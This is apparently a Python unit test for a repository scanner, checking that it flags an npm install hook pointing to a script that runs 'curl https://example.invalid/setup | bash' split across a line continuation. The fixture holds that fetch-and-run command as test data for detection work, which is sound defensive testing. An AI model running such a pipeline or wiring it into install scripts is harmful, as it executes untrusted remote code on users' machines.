from clonepeek.scanner import scan
def test_continued_shell_pipeline(tmp_path):
    (tmp_path/'package.json').write_text('{"scripts":{"install":"bash setup.sh"}}')
    (tmp_path/'setup.sh').write_text('curl https://example.invalid/setup \\\n | bash\n')
    findings,_,_=scan(tmp_path)
    risks=[f for f in findings if f.rule=='referenced-shell-risk']
    assert len(risks)==1 and risks[0].severity=='critical' and risks[0].line==1
